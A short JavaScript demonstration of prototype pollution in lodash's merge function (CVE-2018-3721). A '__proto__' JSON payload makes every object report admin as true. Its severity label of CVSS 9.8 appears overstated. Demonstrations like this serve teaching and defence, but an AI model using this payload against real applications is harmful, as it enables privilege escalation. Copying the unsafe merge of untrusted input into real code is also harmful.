const _ = require('lodash');

/**
 * PROTOTYPE POLLUTION DEMONSTRATION
 * Vulnerability: CVE-2018-3721
 * Severity: Critical (CVSS 9.8)
 */

// 1. Imagine this is malicious JSON input from a user
const maliciousPayload = JSON.parse('{"__proto__": {"admin": true}}');

// 2. An empty, normal user object
const user = {};

console.log("Before pollution - Is user an admin?", user.admin); // undefined

// 3. The vulnerable operation: merging untrusted input
_.merge({}, maliciousPayload);

// 4. The impact: The global prototype has been modified
console.log("After pollution - Is user an admin?", user.admin); // true
console.log("Impact: Even a new object is now admin:", {}.admin); // true
